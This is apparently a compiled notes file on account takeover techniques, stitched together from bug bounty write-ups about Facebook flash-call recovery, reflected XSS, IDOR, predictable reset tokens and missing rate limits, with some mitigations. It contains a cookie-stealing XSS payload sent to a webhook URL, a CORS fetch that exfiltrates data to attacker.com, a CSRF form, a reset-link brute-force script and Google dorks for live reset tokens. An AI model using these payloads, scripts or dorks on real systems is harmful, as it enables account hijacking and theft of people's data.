1. I enter my email/phone.
2. Choose phone call recovery option.
3. I receive a phone call.
4. That phone number will be automatically supplied to the endpoint as:

`**POST /flash_call_recovery**`

`**_cuid=x&enc_phone=x&cli=+1xxxxx_**`

Turns out in `**cli**` parameter we are basically supposed to supply the phone number from which we received the phone call in Step3.

Now it all made sense why it was called phone call recovery[🤦‍♂️](https://emojipedia.org/man-facepalming/)

I guess the `**cli**` means something like _caller identification_.

In an ideal scenario when supplied all valid values, we would then receive this following response:

`**{“id”:”UserID”,”nonce”:”XXXX”,"skip_logout_pw_reset":""}**`

![](https://miro.medium.com/v2/resize:fit:411/1*VJlCibnNuZ5t6SwMhBbQKQ.png)

This `**nonce**` value acts as an OTP code and then will be supplied to the OTP verification endpoint.

The OTP verification endpoint is then responsible for validating the `**nonce**` and setting the new password.

![](https://miro.medium.com/v2/resize:fit:627/1*h0cpVR0UmhVogdsXqOD-iA.png)

In `**POST /flash_call_recovery**` , I initially tested if supplying another user’s valid `**cli**` with victim’s `**cuid**` would work, but it didn't.

I tried flipping every parameters here and there but non of them worked.

Now, the only option I was left with was bruteforcing the `**cli**`.

Considering how strict FB is with rate limiting since it even has rate limit implemented on non authentication endpoints I had little to no hope.

But to my absolute surprise, it had no rate limit implemented in this endpoint.

**Hence the attack would work like this:**

1. User supplies victim’s `cuid` and `enc_phone_number` in flashcall recovery endpoint
2. Bruteforces the `cli`
3. Receives the `nonce` from the response
4. Supplies the `nonce` in OTP verification endpoint and sets a new password for victim’s account.

<iframe width="680" height="382" src="https://www.youtube.com/embed/UL2nkmzNPg8" title="Flash call Account recovery" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>


**Timeline of Email Disclosure**

**Submitted:** April 25, 2021  
**Triaged:** April 27,2021**Fixed:** April 27,2021

**Timeline of Account Takeover**

**Submitted**: April 29, 2021  
**Triaged** : April 30, 2021 at 3:32 PM  
**Fixed**: April 30, 2021 at 3:49 PM

---

## How I Discovered Account Takeover (ATO) via Cross-Site Scripting (XSS)

While hunting for a program with millions of users — specifically a large blog website, which I’ll refer to as redacted.com — I began by enumerating its subdomains. One subdomain I found was **jp.redacted.com**.

Next, I utilized ==Param Spider== to gather all possible parameters. The command I used was:


```bash
param spider -d jp.redacted.com -s  (to list in the terminal all possible parameters0
```

This command listed all possible parameters in the terminal. Among them, I discovered a parameter called **s=**, which allowed me to execute reflected XSS (RXSS) with a simple payload:

<script>alert(1)</script>

![](https://miro.medium.com/v2/resize:fit:700/1*RoZet6wDPJj_WVBnv9x3iQ.png)

										RXSS


Once I got I tried to escalate it to the ATO using a simple payload

```
<img src="x" onerror=document.location=%27https://webhook.site/790fbd5e-8cc4-441e-9a81-6ac18f40cb5f?c=%27+document.cookie;">
```


However, this approach did not work, and I tried numerous payloads without success. After some experimentation,~={red} I decided to encode my payloads in Base64…=~

![](https://miro.medium.com/v2/resize:fit:700/1*Y2y1BGAfk8SIIUha_AuRMQ.png)

							ATO Via RXSS

I reported the ATO vulnerability via RXSS to the team, but unfortunately, I have not received a response in the last five months.


---

### 2. Authorization Issue

**Concept:** Poor authorization checks allow attackers to hijack accounts during email change requests.

#### Exploitation Steps:

1. **Change Account A's email** to `email_B@example.com`.
2. **Check the confirmation email** sent to `email_B@example.com`.
3. **Open the confirmation link using Account C**, which results in Account C being taken over.

#### Mitigation:

✅ Require the **current password** before changing email.

✅ Use strict email verification with unique per-user tokens.

✅ Implement session invalidation after email change.

![None](https://miro.medium.com/v2/resize:fit:700/0*JWrO6K2RqgjwR6PP.png)

		ATO — @verylazytech

### 3. Reusing Reset Token

**Concept:** If a reset password link remains valid after use, attackers can reuse the token to reset passwords again.

#### Exploitation Steps:

1. Use tools like `gau`, `wayback`, or `urlscan.io` to hunt for exposed reset links.
2. Test whether **old password reset links still work**.
3. If valid, use the same reset link to hijack accounts.

🔗 **Tools:**

- [gau (Get All URLs)](https://github.com/lc/gau)
- [Wayback Machine](https://web.archive.org/)
- [URLScan](https://urlscan.io/)

#### Mitigation:

✅ Reset tokens should **expire immediately after first use**.

✅ Implement **rate limiting** on reset requests.

✅ Store **hashed tokens** instead of plain links.

### 4. Pre-Account Takeover

**Concept:** Attackers can register an account with an email before the real owner does and later hijack it.

#### Exploitation Steps:

1. Sign up using `victim@example.com`, but **do not verify the account**.
2. Wait for the victim to sign up using **OAuth (Google, Facebook, etc.)**.
3. The victim unknowingly **verifies** the attacker's account.
4. The attacker can now log in with the password they initially set.

#### Mitigation:

✅ Require **email verification before activation**.

✅ Link OAuth logins only to **verified** email accounts.

### 5. CORS Misconfiguration to ATO

**Concept:** Weak CORS policies allow attackers to steal authentication tokens from API responses.

#### Exploitation Steps:

1. Identify APIs that return `access_token`, `session_id`, or `secret_key`.
2. Check if the server allows **cross-origin** requests from `attacker.com`.
3. Inject a malicious JavaScript payload to fetch sensitive data:

`fetch("https://target.com/api/user", {credentials: "include"})       .then(response => response.text())            
`.then(data => fetch("https://attacker.com/log?data="+data));`

4. Steal authentication tokens and hijack accounts.

#### Mitigation:

✅ Restrict CORS to **trusted origins only**.

✅ **Do not expose sensitive data** to third-party origins.

✅ Use **SameSite cookies** and CSRF tokens.

### 6. CSRF to ATO

**Concept:** If email modification does not require authentication tokens, an attacker can force a victim to change their email.

#### Exploitation Steps:

1. Intercept an email change request:

`POST /change_email HTTP/1.1  Host: target.com  email=attacker@example.com`

2. Create a CSRF exploit page:

`<form action="https://target.com/change_email" method="POST">          <input type="hidden" name="email" value="attacker@example.com">          <input type="submit" value="Click Me">  </form>`

3. Send the link to the victim and wait for them to click.

#### Mitigation:

✅ Implement **CSRF tokens**.

✅ Require **current password** for email change.

✅ Use **email verification** for changes.

### 7. Host Header Injection

**Concept:** Some applications trust the `Host` header, allowing attackers to manipulate password reset emails.

#### Exploitation Steps:

1. Change `Host` header in a password reset request:

`Host: attacker.com`

2. Modify proxy headers such as `X-Forwarded-For`:

`X-Forwarded-For: attacker.com`

3. Request a password reset email, and the reset link will be sent to `attacker.com`.

#### Mitigation:

✅ Validate and **sanitize the Host header**.

✅ Use **hardcoded domains** for password reset links.

✅ Implement **HSTS (HTTP Strict Transport Security)**.

### 8. Response Manipulation

**Concept:** Some applications validate login/reset requests based on response codes or messages.

#### Exploitation Steps:

1. Change the response code to `200 OK`:

`HTTP/1.1 200 OK`

2. Modify JSON response:

`{"success":true}`

3. If the application does not verify backend responses, the attacker gains access.

#### Mitigation:

✅ Implement **strict response validation** on the client-side.

✅ Validate authentication and session tokens properly.


---
# How I was able to reveal page admin of almost any page on Facebook

_So after 2 years of trying to find on the technical side of Facebook and after lots of duplicates and informative, I finally managed to find an IDOR vulnerability on Facebook’s Android app ._

**_Why did I choose Facebook android?_** _I was frustrated with trying on the Facebook web, checking all those responses and requests, trying to find something hidden. So I tried_ [_intercepting on the Facebook Android app_](https://www.facebook.com/whitehat/education/testing-guides)_.  
I managed to find a strange behaviour while checking the request and responses of my HTTP history were while viewing the live video of any page, I was getting the admin’s real id in the response stated in the “broadcaster_id” parameter._

## **The Bug:**

While intercepting and navigating to the other **page’s live video section** in FB android, I found a vulnerable endpoint in the doc_id=4449530781773796 , where **when the page_id in the request is changed to any page then the page admin is disclosed in the response in the broadcaster_id parameter**.

**Impact:**  
It leads to page admin disclosure which is a privacy issue to the page. The impact is high because the page’s admin information is meant to be kept private and not shown to the public.

## Repro Steps:

> 1. Send a Post request to graph.facebook.com/graphql with doc_id=4449530781773796  
> 2. Edit the page_id in the request to any page.  
> 3.In the response, we can disclose the admin easily by seeing the `broadcaster_id=`

![](https://miro.medium.com/v2/resize:fit:700/1*8IT3-qlKzGj4cZuZyMFKmQ.png)

Here is the poc : [https://youtu.be/bskV-Nr64rE](https://youtu.be/bskV-Nr64rE)

This bug could’ve affected most of the pages on Facebook because most of the pages have live video features nowadays.

To perform the exploit on a mass scale ,a script would be created to automate and change the value of the page_id in the request and capture the broadcaster_id from the response and save it in a file .  
Or ,  
We can use the [Intruder option of Burpsuite](https://portswigger.net/burp/documentation/desktop/tools/intruder/using) and select the page_id and insert the list of page_id’s in the payloads and run it . Then we could get the admin info in the response and save it in a text file for targeting .

## 2nd Scenario:

I found one more scenario of the issue where the exact live_video_id can be provided in the request and then the admin will be disclosed in the response through IDOR vulnerability .  
The Upper case used directly any page_id but this case uses the exact live_video_id . In this case, the vulnerable doc_id is doc_id=5048752835141848 where the video_id can be changed to any live video’s id then the admin of the page will be disclosed in the response in the broadcaster_id parameter.

> **Here are the steps** _:  
> _1. Page conducts a live video  
> 1. Attacker intercepts FB4A and then searches for doc_id=5048752835141848  
> 2. Change the video id to the required page’s live video id  
> 3. We can see the admin of the page being disclosed in the broadcaster_id= parameter in the response.

![](https://miro.medium.com/v2/resize:fit:700/1*n3ahhyPG-gnlm5VzVRRBFA.png)

							idor2

The second case got duplicated of the first issue because they both had the same root cause.

**_Timeline:_**

**_Initial report sent_**: October 5, 2021  
**_The second scenario sent_**: October 6, 2021  
**_Triaged_**: October 7, 2021

![](https://miro.medium.com/v2/resize:fit:700/1*SikBSRbPXdIRRDf1GdGrBQ.png)

**_Fixed_**: October 21, 2021

![](https://miro.medium.com/v2/resize:fit:700/1*qMdF5tSYVqQ_D2MmPgjZwA.png)

**_Rewarded_**: **4500$** Bounty rewarded on November 5, 2021

![](https://miro.medium.com/v2/resize:fit:700/1*XzFHFDX7JRuHM5z9-7YzuQ.png)




---

<iframe width="928" height="522" src="https://www.youtube.com/embed/pk7oYuz4x0Q" title="2022-style OAuth account takeover on Facebook - $45,000 bug bounty" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>



---


<iframe width="928" height="522" src="https://www.youtube.com/embed/MGyIUDxfQFM" title="500$ Bug Bounty PoC where CSRF leads to ACCOUNT TAKEOVER by bypassing token" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

![[Pasted image 20241201004816.png]]

### Basic password reset poisoning

-> enable Burp on foxyproxy but disable interception on Burp -> search for forgot password functionality:

![[Pasted image 20241201013943.png]]

Try to change the host, you will notice that's vulnerable if it actually sends a password reset link with that domain:

![[Pasted image 20241201013927.png]]

![[Pasted image 20241201014043.png]]


---

<iframe width="934" height="522" src="https://www.youtube.com/embed/GKmed3REMcA" title="Password Reset Poisoning Via Host Header Injection Bug Bounty Poc" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>


- **Host Header Injection**
- Checking if the **Reset Password Token** is leaked in the response
- Sending two emails in one request to see if both receive the same token
- Reusing the token multiple times or testing if it doesn’t expire
- Checking for the absence of **Rate Limiting** on Reset Password requests, which could enable email bombing

----

source from: [not random passwd reset token link]([Breaking Algorithm Leads to Account Takeover | by ASTUTE | Medium](https://medium.com/@prakashchand72/breaking-algorithm-leads-to-account-takeover-29a0aa86f816))

_I could reset anyone's account without knowing the victim's password and access it by resetting the account and creating a new password of my own._

## Analysis & Approach

I created 2 accounts let's say attacker@email.com & victim@email.com, and then I analyzed the reset link I received on both of the accounts. At first, I saw it was almost random for both accounts, but when I did it for the 2nd time on both of the accounts I noticed something in the patterns of the link.

I tried to reset links 20x2 times (almost) to know the behavior on different timelines and make a collection of it to analyze it in depth. Therefore, I found some clues in its pattern.

![](https://miro.medium.com/v2/resize:fit:656/1*HjZdSDyXoGKta9krPqSmYA.png)

# Observation & Result

![](https://miro.medium.com/v2/resize:fit:656/1*T0zW-W6ncYF4nWn9bHgMcA.png)

so from the above result, I can see that it has a pattern to send the reset link but now the question is, how can I take over the account of others?

Here is the answer, all I need is the email of the victim(victim@email.com) and mine(attacker@email.com) I sent the reset links to both of the emails at almost the same time. Since I now only have the reset link of my own but not the victim’s however I have the analysis, I **only have 26 possibilities or 10 possibilities.** Now with only 10 or 26 possibilities, I can reset the victim@email.com and create a new password for the same, therefore I can log in to the account with the email and password I just reset.

I said 10 or 26 because as shown in the picture above the only changeable parameter is [-3:] indexing, so it can be either A-Z or 0–9, if I get a reset link as a number then the possibilities will be 10 and if Alphabet it will be 26.

Now that I know the flaws, the exploitation is like a walk in the park, I recorded the screen for POC, opened 2 browsers, and reset the account with emails, attacker@email.com & victim@email.com. I opened the reset link of attacker@email.com and made a small script to **generate the links of a changeable parameter based on either numeric or alphabets** and opened the same link with multiple-URL Opener Extension, you can do the same with Burpsuite Intruder **but remember to change the User-Agent**, I did it in such a way to get more flexibility.

```python
#replace the baseurl account to the url recieved on attacker email  
base_url = "https://sub.redacted.com/secur/forgotpassword.jsp?id=0054J000007be1OQAA"  
  
# Generate URLs  
urls = []  
for char in range(ord('a'), ord('z')+1):  
new_url = base_url[:-4] + chr(char) + base_url[-3:]  
urls.append(new_url)  
  
# Print the URLs  
for url in urls:  
print(url)
```

Quick explanation:

 _The script is designed to brute-force the fifth character from the end of the URL by iterating through all lowercase alphabetic characters (a-z)._
- **Define the Base URL**:
    
    
    ```python
    base_url = "https://sub.redacted.com/secur/forgotpassword.jsp?id=0054J000007be1OQAA"
    ```
    
    This is the initial URL that the script will modify.
    
- **Initialize an Empty List for URLs**:
    
    
    ```python
    urls = []
    ```
    
    This list will store the generated URLs.

```python
    for char in range(ord('a'), ord('z')+1):
        new_url = base_url[:-4] + chr(char) + base_url[-3:]
        urls.append(new_url)
 ```

 The `for` loop iterates over the ASCII values of lowercase letters 'a' to 'z'.
        
`ord('a')` gives the ASCII value of 'a', and `ord('z')` gives the ASCII value of 'z'.
        
- `chr(char)` converts the ASCII value back to the corresponding character.
        
    - `base_url[:-4]` takes all characters of the base URL except the last 4.
        
    - `base_url[-3:]` takes the last 3 characters of the base URL.
        
    - `new_url` is created by inserting the character `chr(char)` into the base URL at the position 4 characters from the end.
        
    - Each `new_url` is appended to the `urls` list.
        
- **Print the Generated URLs**:
    
    
    ```python
    for url in urls:
        print(url)
    ```
    
    This loop prints each URL in the `urls` list.


## Bonus:

```Python
# Iterate through numeric characters (0-9)
for char in range(ord('0'), ord('9')+1): new_url = base_url[:-4] + chr(char) + base_url[-3:] urls.append(new_url)
```


_You can add this script, so now it iterates through each character, and for each one, it outputs the url, and does the same thing with the numbers_


Now I can reset the password of any email.

![](https://miro.medium.com/v2/resize:fit:656/1*TW68Dr6Yk918oTPwFyxTbw.png)


----

## Find Leaked password reset links endpoints:

```bash
site:*.com inurl:”@gmail.com” reset password

site:*.com inurl:”@hotmail.com” reset password

site:*.com inurl:”@gmail.com” OR inurl:”@hotmail.com” token=

site:*.com inurl:phone= | inurl:token=
```

![](https://miro.medium.com/v2/resize:fit:656/1*HmzpAuxX6GYzE-9GVwWNFw.png)

![](https://miro.medium.com/v2/resize:fit:656/1*x5pjssKj33ooj4zYHdijfw.png)

![](https://miro.medium.com/v2/resize:fit:656/1*ANEWeim_FGG1IrOUC2kHWg.png)


_Using this dork, I uncovered several publicly indexed pages that displayed sensitive password reset links, complete with email addresses. Some of these links were live and could theoretically allow an attacker to hijack a password reset process._

1. **Identify the Token**: The reset token is embedded in the URL. It’s usually a long string of characters.
2. **Check the Email**: Some pages also displayed the associated email address. With the email and reset token combined, I could mimic the password reset process for that user.
3. **Complete the Reset**: By navigating to the reset link and inputting a new password, I could gain access to the account associated with that email address.

# The Impact

This kind of exposure has huge implications for user security. If someone stumbles upon these reset tokens, they can easily reset passwords without the user’s knowledge. In the wrong hands, this could lead to account takeovers, data breaches, or worse.


----

source: https://hackerone.com/reports/2915502

**Title:** Lack of Rate Limiting on Account Creation Endpoint

**Description:**  
The **`/account/signinform/premium_tour_login`** endpoint on **[www.xvideos.red](http://www.xvideos.red)** lacks rate limiting, allowing attackers to automate the account creation process. This vulnerability can be exploited to generate a large number of fake accounts by automating requests using tools like Burp Suite's Intruder.

**Endpoint Affected:**  
`POST /account/signinform/premium_tour_login`  
Host: `www.xvideos.red`

**Steps to Reproduce:**

1. Navigate to the account creation page on **[www.xvideos.red](http://www.xvideos.red)**.
2. Fill in the required details such as email, username, and password.
3. Intercept the HTTP POST request using Burp Suite.
4. Send the captured request to Burp Suite's Intruder.
5. Configure the payload position in the email field. For example, replace `hamsa569@gmail.com` with `hamsa<payload>@gmail.com`.
6. Set the payload type to numbers and range it from `0` to `1000`.
7. Start the attack.
8. Observe that the server processes all requests successfully, creating accounts without rate limiting or CAPTCHA validation.

-> show PoC Video about Vuln.

**Impact:**  
This vulnerability can lead to:

- Creation of numerous fake accounts, overwhelming legitimate user registrations.
- Exploitation by malicious actors for bot-related activities, such as spamming or abusing the platform.
- Increased server resource usage and potential degradation of service.

**Suggested Fixes:**

- Implement a rate-limiting mechanism for the affected endpoint. For example:
    - Limit requests to a maximum of 5 per minute per IP address.
- Introduce CAPTCHA verification during the account creation process to prevent automated requests.
- Enforce email verification to finalize the account registration process.

**Proof of Concept (PoC):**

1. Intercepted request (example):

```js
POST /account/signinform/premium_tour_login HTTP/1.1  
Host: www.xvideos.red  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 120  

email=hamsa<payload>@gmail.com&password=test123&username=testuser
```

![[Pasted image 20250122191153.png]]
Screenshot or logs from Burp Suite Intruder showing multiple successful account creation responses for email variations (e.g., `hamsa3@gmail.com`, `hamsa5@gmail.com`, etc.).


![[Pasted image 20250122191252.png]]

## Impact

- **Account Flooding**: Automated creation of fake accounts overwhelms the system.
- **Abuse & Spamming**: Fake accounts can be used for malicious activities.
- **Degraded Performance**: Slower system performance for legitimate users.
- **Data Exposure**: Sensitive user data may be leaked.
- **Reduced Integrity**: Compromised user data and increased security risks.
- **Availability Issues**: Server overload impacting system availability.


_if they don't accept your vuln: insist and add additional evidence:_

![[Pasted image 20250122191814.png]]

![[Pasted image 20250122191753.png]]


---

<iframe width="1013" height="570" src="https://www.youtube.com/embed/ZFst3-r-9Lg" title="$37,500 Shopify auth bypass - Hackerone" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
